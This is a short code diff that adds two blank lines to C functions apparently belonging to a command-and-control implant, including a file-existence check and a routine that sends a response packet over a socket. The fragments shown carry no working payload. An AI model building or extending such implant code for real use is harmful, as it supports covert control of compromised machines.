@@ -113,6 +113,7 @@ bool c2_query_file(char *fpath) {
 
     // F_OK == existence test
     if ((access(fpath, F_OK)) == 0) {
+
         return true;
     }
 
@@ -269,4 +270,5 @@ void build_c2_response2(char *buffer, int buffer_size, char *cmd_id, int sock){
     send(sock, rota_resp_pkt, (82 + buffer_len), 0);
     free(rota_resp_pkt);
     close(sock);
+
 }
